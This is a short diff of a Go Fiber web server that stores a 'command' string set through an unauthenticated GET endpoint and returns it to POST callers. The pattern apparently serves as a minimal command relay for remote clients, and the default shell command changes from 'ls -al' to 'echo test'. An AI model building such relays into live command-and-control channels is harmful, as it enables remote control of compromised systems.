@@ -6,7 +6,7 @@ import (
 )
 
 func main() {
-	responsecmd := "ls -al"
+	responsecmd := "echo test"
 	app := fiber.New()
 
 	app.Post("/", func(ctx *fiber.Ctx) error {
@@ -18,7 +18,7 @@ func main() {
 		return ctx.SendString(responsecmd)
 	})
 
-	app.Get("/postcommand", func(ctx *fiber.Ctx) error {
+	app.Get("/postcmd", func(ctx *fiber.Ctx) error {
 		responsecmd = ctx.FormValue("command")
 		return ctx.SendString(responsecmd)
 	})
